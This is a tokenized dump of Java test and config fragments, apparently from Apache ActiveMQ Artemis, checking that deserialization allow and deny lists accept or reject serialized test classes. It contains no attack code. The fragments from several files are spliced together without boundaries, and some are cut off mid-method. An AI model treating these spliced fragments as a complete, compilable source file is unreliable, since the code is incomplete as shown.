"{", "String", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", "\"", ";", "String", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "integration", ".", "ra", "\"", ";", "testDeserialization", "(", "blackList", ",", "whiteList", ",", "false", ")", ";", "}", "@", "Test", "public", "void", "testObjectMessageReceiveSerializationControl4", "(", ")", "throws", "Exception", "{", "String", "blackList", "=", "null", ";", "String", "whiteList", "=", "\"", "some", ".", "other", ".", "pkg", "\"", ";", "testDeserialization", "(", "blackList", ",", "whiteList", ",", "false", ")", ";", "}", "@", "Test", "public", "void", "testObjectMessageReceiveSerializationControl5", "(", ")", "throws", "Exception", "{", "String", "blackList", "=", "null", ";", "String", "whiteList", "=", "null", ";", "testDeserialization", "(", "blackList", ",", "whiteList", ",", "true", ")", ";", "}", "private", "void", "testDeserialization", "(", "String", "blackList", ",", "String", "whiteList", ",", "boolean", "shouldSucceed", ")", "throws", "Exception", "{", "ActiveMQResourceAdapter", "qResourceAdapter", "=", "newResourceAdapter", "(", ");", "qResourceAdapter", ".", "setDeserializationBlackList", "(", "blackList", ")", ";", "qResourceAdapter", ".", "setDeserializationWhiteList", "(", "whiteList", ")", ";", "MyBootstrapContext", "ctx", "=", "new", "MyBootstrapContext", "(", ");", "qResourceAdapter", ".", "start", "(", "ctx", ")", ";", "ActiveMQActivationSpec", "spec", "=", "new", "ActiveMQActivationSpec", "(", ");", "spec", ".", "setResourceAdapter", "(", "qResourceAdapter", ")", ";", "spec", ".", "setUseJNDI", "(", "false", ")", ";", "spec", ".", "setDestinationType", "(", "\"", "javax", ".", "jms", ".", "Queue", "\"", ");", "spec", ".", "setDestination", "(", "MDBQUEUE", ")", ";", "qResourceAdapter", ".", "setConnectorClassName", "(", "INVM_CONNECTOR_FACTORY", ")", ";", "CountDownLatch", "latch", "=", "new", "CountDownLatch", "(", "1", ")", ";", "DummyMessageEndpoint", "endpoint", "=", "new", "DummyMessageEndpoint", "(", "latch", ")", ";", "DummyMessageEndpointFactory", "endpointFactory", "=", "new", "DummyMessageEndpointFactory", "(", "endpoint", ",", "false", ")", ";", "qResourceAdapter", ".", "endpointActivation", "(", "endpointFactory", ",", "spec", ")", ";", "/", "/", "send", "using", "jms", "ActiveMQConnectionFactory", "jmsFactory", "=", "new", "ActiveMQConnectionFactory", "(", "\"", "vm", ":", "//", "0", "\"", ");", "Connection", "connection", "=", "jmsFactory", ".", "createConnection", "(", ");", "try", "{", "Session", "session", "=", "connection", ".", "createSession", "(", "false", ",", "Session", ".", "AUTO_ACKNOWLEDGE", ")", ";", "Queue", "jmsQueue", "=", "session", ".", "createQueue", "(", "MDBQUEUE", ")", ";", "ObjectMessage", "objMsg", "=", "session", ".", "createObjectMessage", "(", ");", "objMsg", ".", "setObject", "(", "new", "DummySerializable", "(", "))", ";", "MessageProducer", "producer", "=", "session", ".", "createProducer", "(", "jmsQueue", ")", ";", "producer", ".", "send", "(", "objMsg", ")", ";", "}", "finally", "{", "connection", ".", "close", "(", ");", "}", "latch", ".", "await", "(", "5", ",", "TimeUnit", ".", "SECONDS", ")", ";", "assertNotNull", "(", "endpoint", ".", "lastMessage", ")", ";", "ObjectMessage", "objMsg", "=", "(", "ObjectMessage", ")", "endpoint", ".", "lastMessage", ";", "try", "{", "Object", "obj", "=", "objMsg", ".", "getObject", "(", ");", "assertTrue", "(", "\"", "deserialization", "should", "fail", "but", "got", ":", "\"", "+", "obj", ",", "shouldSucceed", ")", ";", "assertTrue", "(", "obj", "instanceof", "DummySerializable", ")", ";", "}", "catch", "(", "JMSException", "e", ")", "{", "assertFalse", "(", "\"", "got", "unexpected", "exception", ":", "\"", "+", "e", ",", "shouldSucceed", ")", ";", "}", "qResourceAdapter", ".", "endpointDeactivation", "(", "endpointFactory", ",", "spec", ")", ";", "qResourceAdapter", ".", "stop", "(", ");", "}", "static", "class", "DummySerializable", "implements", "Serializable", "{", "}", "ActiveMQObjectMessage", "copy", "=", "new", "ActiveMQObjectMessage", "(", "foreignObjectMessage", ",", "session", ",", "null", ")", ";", "\"", "<", "/", "config", "-", "property", ">", "\"", "\"", "<", "config", "-", "property", ">", "\"", "\"", "<", "description", ">", "List", "of", "package", "/", "class", "names", "against", "which", "matching", "objects", "are", "permitted", "to", "be", "deserilized", "<", "/", "description", ">", "\"", "\"", "<", "config", "-", "property", "-", "name", ">", "DeserializationWhiteList", "<", "/", "config", "-", "property", "-", "name", ">", "\"", "\"", "<", "config", "-", "property", "-", "type", ">", "java", ".", "lang", ".", "String", "<", "/", "config", "-", "property", "-", "type", ">", "\"", "\"", "<", "config", "-", "property", "-", "value", ">", "</", "config", "-", "property", "-", "value", ">", "\"", "\"", "<", "/", "config", "-", "property", ">", "\"", "\"", "<", "config", "-", "property", ">", "\"", "\"", "<", "description", ">", "List", "of", "package", "/", "classe", "names", "against", "which", "matching", "objects", "are", "forbidden", "to", "be", "deserialized", "<", "/", "description", ">", "\"", "\"", "<", "config", "-", "property", "-", "name", ">", "DeserializationBlackList", "<", "/", "config", "-", "property", "-", "name", ">", "\"", "\"", "<", "config", "-", "property", "-", "type", ">", "java", ".", "lang", ".", "String", "<", "/", "config", "-", "property", "-", "type", ">", "\"", "\"", "<", "config", "-", "property", "-", "value", ">", "</", "config", "-", "property", "-", "value", ">", "\"", "@", "Test", "public", "void", "testActivationDeserializationParameters", "(", ")", "throws", "Exception", "{", "ActiveMQServer", "server", "=", "createServer", "(", "false", ")", ";", "try", "{", "server", ".", "start", "(", ");", "ActiveMQResourceAdapter", "ra", "=", "new", "ActiveMQResourceAdapter", "(", ");", "ra", ".", "setConnectorClassName", "(", "INVM_CONNECTOR_FACTORY", ")", ";", "ra", ".", "setUserName", "(", "\"", "userGlobal", "\"", ");", "ra", ".", "setPassword", "(", "\"", "passwordGlobal", "\"", ");", "ra", ".", "setDeserializationWhiteList", "(", "\"", "a", ".", "b", ".", "c", ".", "d", ".", "e", "\"", ");", "ra", ".", "setDeserializationBlackList", "(", "\"", "f", ".", "g", ".", "h", ".", "i", ".", "j", "\"", ");", "ra", ".", "start", "(", "new", "BootstrapContext", "(", "))", ";", "ActiveMQConnectionFactory", "factory", "=", "ra", ".", "getDefaultActiveMQConnectionFactory", "(", ");", "assertEquals", "(", "\"", "a", ".", "b", ".", "c", ".", "d", ".", "e", "\"", ",", "factory", ".", "getDeserializationWhiteList", "(", "))", ";", "assertEquals", "(", "\"", "f", ".", "g", ".", "h", ".", "i", ".", "j", "\"", ",", "factory", ".", "getDeserializationBlackList", "(", "))", ";", "ConnectionFactoryProperties", "overrides", "=", "new", "ConnectionFactoryProperties", "(", ");", "overrides", ".", "setDeserializationWhiteList", "(", "\"", "k", ".", "l", ".", "m", ".", "n", "\"", ");", "overrides", ".", "setDeserializationBlackList", "(", "\"", "o", ".", "p", ".", "q", ".", "r", "\"", ");", "factory", "=", "ra", ".", "newConnectionFactory", "(", "overrides", ")", ";", "assertEquals", "(", "\"", "k", ".", "l", ".", "m", ".", "n", "\"", ",", "factory", ".", "getDeserializationWhiteList", "(", "))", ";", "assertEquals", "(", "\"", "o", ".", "p", ".", "q", ".", "r", "\"", ",", "factory", ".", "getDeserializationBlackList", "(", "))", ";", "ra", ".", "stop", "(", ");", "}", "finally", "{", "server", ".", "stop", "(", ");", "}", "}", "import", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "EnclosingClass", ";", "import", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass1", ";", "import", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass2", ";", "import", "java", ".", "io", ".", "FileInputStream", ";", "import", "java", ".", "io", ".", "FileOutputStream", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "org", ".", "junit", ".", "Test", ";", "public", "static", "ClassLoader", "newClassLoader", "(", "final", "Class", ".", "..", "userClasses", ")", "throws", "Exception", "{", "Set", "<", "URL", ">", "userClassUrls", "=", "new", "HashSet", "<", ">(", ");", "for", "(", "Class", "anyUserClass", ":", "userClasses", ")", "{", "ProtectionDomain", "protectionDomain", "=", "anyUserClass", ".", "getProtectionDomain", "(", ");", "CodeSource", "codeSource", "=", "protectionDomain", ".", "getCodeSource", "(", ");", "URL", "classLocation", "=", "codeSource", ".", "getLocation", "(", ");", "userClassUrls", ".", "add", "(", "classLocation", ")", ";", "}", "pathIgnore", "=", "userClassUrls", ".", "iterator", "(", ").", "next", "(", ").", "toString", "(", ");", "if", "(", "!", "userClassUrls", ".", "contains", "(", "itemLocation", ")", "&", "&", "itemLocation", ".", "toString", "(", ").", "indexOf", "(", "pathIgnore", ")", ">", "=", "0", ")", "{", "ClassLoader", "appClassLoader", "=", "URLClassLoader", ".", "newInstance", "(", "userClassUrls", ".", "toArray", "(", "new", "URL", "[", "0", "]", "),", "masterClassLoader", ")", ";", "/", "/", "Class", ".", "isAnonymousClass", "(", ")", "call", "used", "in", "ObjectInputStreamWithClassLoader", "/", "/", "need", "to", "access", "the", "enclosing", "class", "and", "its", "parent", "class", "of", "the", "obj", "/", "/", "i", ".", "e", ".", "ActiveMQTestBase", "and", "Assert", ".", "ClassLoader", "testClassLoader", "=", "ObjectInputStreamWithClassLoaderTest", ".", "newClassLoader", "(", "obj", ".", "getClass", "(", "),", "ActiveMQTestBase", ".", "class", ",", "Assert", ".", "class", ")", ";", "ClassLoader", "testClassLoader", "=", "ObjectInputStreamWithClassLoaderTest", ".", "newClassLoader", "(", "this", ".", "getClass", "(", "),", "ActiveMQTestBase", ".", "class", ",", "Assert", ".", "class", ")", ";", "@", "Test", "public", "void", "testWhiteBlackList", "(", ")", "throws", "Exception", "{", "File", "serailizeFile", "=", "new", "File", "(", "temporaryFolder", ".", "getRoot", "(", "),", "\"", "testclass", ".", "bin", "\"", ");", "ObjectOutputStream", "outputStream", "=", "new", "ObjectOutputStream", "(", "new", "FileOutputStream", "(", "serailizeFile", ")", ");", "try", "{", "outputStream", ".", "writeObject", "(", "new", "TestClass1", "(", "))", ";", "outputStream", ".", "flush", "(", ");", "}", "finally", "{", "outputStream", ".", "close", "(", ");", "}", "/", "/", "default", "assertNull", "(", "readSerializedObject", "(", "null", ",", "null", ",", "serailizeFile", ")", ");", "/", "/", "white", "list", "String", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", "\"", ";", "assertNull", "(", "readSerializedObject", "(", "whiteList", ",", "null", ",", "serailizeFile", ")", ");", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", "\"", ";", "assertNull", "(", "readSerializedObject", "(", "whiteList", ",", "null", ",", "serailizeFile", ")", ");", "whiteList", "=", "\"", "some", ".", "other", ".", "package", "\"", ";", "Exception", "result", "=", "readSerializedObject", "(", "whiteList", ",", "null", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "/", "/", "blacklist", "String", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", "\"", ";", "result", "=", "readSerializedObject", "(", "null", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", "\"", ";", "result", "=", "readSerializedObject", "(", "null", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg2", "\"", ";", "result", "=", "readSerializedObject", "(", "null", ",", "blackList", ",", "serailizeFile", ")", ";", "assertNull", "(", "result", ")", ";", "blackList", "=", "\"", "some", ".", "other", ".", "package", "\"", ";", "whiteList", "=", "\"", "some", ".", "other", ".", "package1", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "/", "/", "blacklist", "priority", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ",", "some", ".", "other", ".", "package", "\"", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ",", "some", ".", "other", ".", "package", "\"", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "pkg2", ",", "some", ".", "other", ".", "package", "\"", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertNull", "(", "result", ")", ";", "blackList", "=", "\"", "some", ".", "other", ".", "package", ",", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg2", "\"", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertNull", "(", "result", ")", ";", "/", "/", "wildcard", "blackList", "=", "\"", "*\"", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "blackList", "=", "\"", "*\"", ";", "whiteList", "=", "\"", "*\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "null", ",", "serailizeFile", ")", ";", "assertNull", "(", "result", ")", ";", "}", "@", "Test", "public", "void", "testWhiteBlackListAgainstArrayObject", "(", ")", "throws", "Exception", "{", "File", "serailizeFile", "=", "new", "File", "(", "temporaryFolder", ".", "getRoot", "(", "),", "\"", "testclass", ".", "bin", "\"", ");", "TestClass1", "[", "]", "sourceObject", "=", "new", "TestClass1", "[", "]{", "new", "TestClass1", "(", ")}", ";", "ObjectOutputStream", "outputStream", "=", "new", "ObjectOutputStream", "(", "new", "FileOutputStream", "(", "serailizeFile", ")", ");", "try", "{", "outputStream", ".", "writeObject", "(", "sourceObject", ")", ";", "outputStream", ".", "flush", "(", ");", "}", "finally", "{", "outputStream", ".", "close", "(", ");", "}", "/", "/", "default", "ok", "String", "blackList", "=", "null", ";", "String", "whiteList", "=", "null", ";", "Object", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertNull", "(", "result", ")", ";", "/", "/", "now", "blacklist", "TestClass1", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass1", "\"", ";", "whiteList", "=", "null", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "/", "/", "now", "whitelist", "TestClass1", ",", "it", "should", "pass", ".", "blackList", "=", "null", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass1", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertNull", "(", "result", ")", ";", "}", "@", "Test", "public", "void", "testWhiteBlackListAgainstListObject", "(", ")", "throws", "Exception", "{", "File", "serailizeFile", "=", "new", "File", "(", "temporaryFolder", ".", "getRoot", "(", "),", "\"", "testclass", ".", "bin", "\"", ");", "List", "<", "TestClass1", ">", "sourceObject", "=", "new", "ArrayList", "<", ">(", ");", "sourceObject", ".", "add", "(", "new", "TestClass1", "(", "))", ";", "ObjectOutputStream", "outputStream", "=", "new", "ObjectOutputStream", "(", "new", "FileOutputStream", "(", "serailizeFile", ")", ");", "try", "{", "outputStream", ".", "writeObject", "(", "sourceObject", ")", ";", "outputStream", ".", "flush", "(", ");", "}", "finally", "{", "outputStream", ".", "close", "(", ");", "}", "/", "/", "default", "ok", "String", "blackList", "=", "null", ";", "String", "whiteList", "=", "null", ";", "Object", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertNull", "(", "result", ")", ";", "/", "/", "now", "blacklist", "TestClass1", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass1", "\"", ";", "whiteList", "=", "null", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "/", "/", "now", "whitelist", "TestClass1", ",", "should", "fail", "because", "the", "List", "type", "is", "not", "allowed", "blackList", "=", "null", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass1", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "/", "/", "now", "add", "List", "to", "white", "list", ",", "it", "should", "pass", "blackList", "=", "null", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass1", ",", "\"", "\"", "java", ".", "util", ".", "ArrayList", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertNull", "(", "result", ")", ";", "}", "@", "Test", "public", "void", "testWhiteBlackListAgainstListMapObject", "(", ")", "throws", "Exception", "{", "File", "serailizeFile", "=", "new", "File", "(", "temporaryFolder", ".", "getRoot", "(", "),", "\"", "testclass", ".", "bin", "\"", ");", "Map", "<", "TestClass1", ",", "TestClass2", ">", "sourceObject", "=", "new", "HashMap", "<", ">(", ");", "sourceObject", ".", "put", "(", "new", "TestClass1", "(", "),", "new", "TestClass2", "(", "))", ";", "ObjectOutputStream", "outputStream", "=", "new", "ObjectOutputStream", "(", "new", "FileOutputStream", "(", "serailizeFile", ")", ");", "try", "{", "outputStream", ".", "writeObject", "(", "sourceObject", ")", ";", "outputStream", ".", "flush", "(", ");", "}", "finally", "{", "outputStream", ".", "close", "(", ");", "}", "String", "blackList", "=", "null", ";", "String", "whiteList", "=", "null", ";", "Object", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertNull", "(", "result", ")", ";", "/", "/", "now", "blacklist", "the", "key", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass1", "\"", ";", "whiteList", "=", "null", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "/", "/", "now", "blacklist", "the", "value", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass2", "\"", ";", "whiteList", "=", "null", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "/", "/", "now", "white", "list", "the", "key", ",", "should", "fail", "too", "because", "value", "is", "forbidden", "blackList", "=", "null", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass1", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "/", "/", "now", "white", "list", "the", "value", ",", "should", "fail", "too", "because", "the", "key", "is", "forbidden", "blackList", "=", "null", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass2", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "/", "/", "both", "key", "and", "value", "are", "in", "the", "whitelist", ",", "it", "should", "fail", "because", "HashMap", "not", "permitted", "blackList", "=", "null", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass1", ",", "\"", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass2", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "/", "/", "now", "add", "HashMap", ",", "test", "should", "pass", ".", "blackList", "=", "null", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass1", ",", "\"", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "TestClass2", ",", "\"", "\"", "java", ".", "util", ".", "HashMap", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertNull", "(", "result", ")", ";", "}", "@", "Test", "public", "void", "testWhiteBlackListAnonymousObject", "(", ")", "throws", "Exception", "{", "File", "serailizeFile", "=", "new", "File", "(", "temporaryFolder", ".", "getRoot", "(", "),", "\"", "testclass", ".", "bin", "\"", ");", "ObjectOutputStream", "outputStream", "=", "new", "ObjectOutputStream", "(", "new", "FileOutputStream", "(", "serailizeFile", ")", ");", "try", "{", "Serializable", "object", "=", "EnclosingClass", ".", "anonymousObject", ";", "assertTrue", "(", "object", ".", "getClass", "(", ").", "isAnonymousClass", "(", "))", ";", "outputStream", ".", "writeObject", "(", "object", ")", ";", "outputStream", ".", "flush", "(", ");", "}", "finally", "{", "outputStream", ".", "close", "(", ");", "}", "/", "/", "default", "String", "blackList", "=", "null", ";", "String", "whiteList", "=", "null", ";", "assertNull", "(", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ");", "/", "/", "forbidden", "by", "specifying", "the", "enclosing", "class", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "EnclosingClass", "\"", ";", "Object", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "/", "/", "do", "it", "in", "whiteList", "blackList", "=", "null", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "EnclosingClass", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertNull", "(", "result", ")", ";", "}", "@", "Test", "public", "void", "testWhiteBlackListLocalObject", "(", ")", "throws", "Exception", "{", "File", "serailizeFile", "=", "new", "File", "(", "temporaryFolder", ".", "getRoot", "(", "),", "\"", "testclass", ".", "bin", "\"", ");", "ObjectOutputStream", "outputStream", "=", "new", "ObjectOutputStream", "(", "new", "FileOutputStream", "(", "serailizeFile", ")", ");", "try", "{", "Object", "object", "=", "EnclosingClass", ".", "getLocalObject", "(", ");", "assertTrue", "(", "object", ".", "getClass", "(", ").", "isLocalClass", "(", "))", ";", "outputStream", ".", "writeObject", "(", "object", ")", ";", "outputStream", ".", "flush", "(", ");", "}", "finally", "{", "outputStream", ".", "close", "(", ");", "}", "/", "/", "default", "String", "blackList", "=", "null", ";", "String", "whiteList", "=", "null", ";", "assertNull", "(", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ");", "/", "/", "forbidden", "by", "specifying", "the", "enclosing", "class", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "EnclosingClass", "\"", ";", "Object", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertTrue", "(", "result", "instanceof", "ClassNotFoundException", ")", ";", "/", "/", "do", "it", "in", "whiteList", "blackList", "=", "null", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ".", "EnclosingClass", "\"", ";", "result", "=", "readSerializedObject", "(", "whiteList", ",", "blackList", ",", "serailizeFile", ")", ";", "assertNull", "(", "result", ")", ";", "}", "@", "Test", "public", "void", "testWhiteBlackListSystemProperty", "(", ")", "throws", "Exception", "{", "File", "serailizeFile", "=", "new", "File", "(", "temporaryFolder", ".", "getRoot", "(", "),", "\"", "testclass", ".", "bin", "\"", ");", "ObjectOutputStream", "outputStream", "=", "new", "ObjectOutputStream", "(", "new", "FileOutputStream", "(", "serailizeFile", ")", ");", "try", "{", "outputStream", ".", "writeObject", "(", "new", "TestClass1", "(", "))", ";", "outputStream", ".", "flush", "(", ");", "}", "finally", "{", "outputStream", ".", "close", "(", ");", "}", "System", ".", "setProperty", "(", "ObjectInputStreamWithClassLoader", ".", "BLACKLIST_PROPERTY", ",", "\"", "system", ".", "defined", ".", "black", ".", "list", "\"", ");", "System", ".", "setProperty", "(", "ObjectInputStreamWithClassLoader", ".", "WHITELIST_PROPERTY", ",", "\"", "system", ".", "defined", ".", "white", ".", "list", "\"", ");", "try", "{", "ObjectInputStreamWithClassLoader", "ois", "=", "new", "ObjectInputStreamWithClassLoader", "(", "new", "FileInputStream", "(", "serailizeFile", ")", ");", "String", "bList", "=", "ois", ".", "getBlackList", "(", ");", "String", "wList", "=", "ois", ".", "getWhiteList", "(", ");", "assertEquals", "(", "\"", "wrong", "black", "list", ":", "\"", "+", "bList", ",", "\"", "system", ".", "defined", ".", "black", ".", "list", "\"", ",", "bList", ")", ";", "assertEquals", "(", "\"", "wrong", "white", "list", ":", "\"", "+", "wList", ",", "\"", "system", ".", "defined", ".", "white", ".", "list", "\"", ",", "wList", ")", ";", "ois", ".", "close", "(", ");", "}", "finally", "{", "System", ".", "clearProperty", "(", "ObjectInputStreamWithClassLoader", ".", "BLACKLIST_PROPERTY", ")", ";", "System", ".", "clearProperty", "(", "ObjectInputStreamWithClassLoader", ".", "WHITELIST_PROPERTY", ")", ";", "}", "}", "private", "Exception", "readSerializedObject", "(", "String", "whiteList", ",", "String", "blackList", ",", "File", "serailizeFile", ")", "{", "Exception", "result", "=", "null", ";", "ObjectInputStreamWithClassLoader", "ois", "=", "null", ";", "try", "{", "ois", "=", "new", "ObjectInputStreamWithClassLoader", "(", "new", "FileInputStream", "(", "serailizeFile", ")", ");", "ois", ".", "setWhiteList", "(", "whiteList", ")", ";", "ois", ".", "setBlackList", "(", "blackList", ")", ";", "ois", ".", "readObject", "(", ");", "}", "catch", "(", "Exception", "e", ")", "{", "result", "=", "e", ";", "}", "finally", "{", "try", "{", "ois", ".", "close", "(", ");", "}", "catch", "(", "IOException", "e", ")", "{", "result", "=", "e", ";", "}", "}", "return", "result", ";", "}", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", 